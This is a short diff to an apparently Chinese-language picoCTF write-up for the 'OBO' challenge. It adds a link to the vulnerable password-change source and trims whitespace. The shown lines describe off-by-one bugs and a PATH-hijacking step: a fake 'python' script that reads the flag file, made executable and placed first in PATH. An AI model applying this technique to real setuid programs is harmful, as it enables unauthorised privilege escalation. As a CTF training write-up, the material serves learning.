@@ -1,5 +1,5 @@
 # OBO
-拿到一個更改密碼的程式碼，一眼能看出許多地方有邊界錯誤：
+拿到一個[更改密碼的程式碼](obo.c)，一眼能看出許多地方有邊界錯誤：
  * 在generate_hex_table 這個程式裡：
 ```c
 hex_table[256];
@@ -50,7 +50,7 @@ cat /home/obo/flag.txt
 pico62895@shell:~$ vim python
 #!/bin/sh
 cat /home/obo/flag.txt
-pico62895@shell:~$ chmod +x python 
+pico62895@shell:~$ chmod +x python
 pico62895@shell:~$ export PATH=/home_users/pico62895:$PATH
 #!/bin/sh
 cat /home/obo/flag.txt
